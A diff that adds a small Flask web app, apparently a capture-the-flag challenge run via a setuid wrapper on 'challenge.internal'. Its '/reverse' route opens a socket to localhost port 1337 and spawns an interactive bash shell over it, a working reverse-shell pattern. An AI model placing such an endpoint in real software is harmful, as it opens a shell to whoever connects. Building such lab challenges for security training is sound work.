@@ -1,0 +1,37 @@
+#!/usr/bin/exec-suid --environ=none --real -- /usr/local/bin/python -I
+
+import os
+import socket
+import subprocess
+
+from flask import Flask
+
+app = Flask(__name__)
+
+
+@app.route("/", methods=["GET"])
+def health():
+    return "OK", 200
+
+
+@app.route("/reverse")
+def connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("127.0.0.1", 1337))
+
+    [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
+
+    subprocess.call(["/bin/bash", "-i"])
+
+    return "Shell spawned!"
+
+
+app.config["SERVER_NAME"] = "challenge.internal"
+app.run(
+    "challenge.internal",
+    443,
+    ssl_context=(
+        "/etc/ssl/certs/internal.cert.pem",
+        "/etc/ssl/private/internal.key.pem",
+    ),
+)
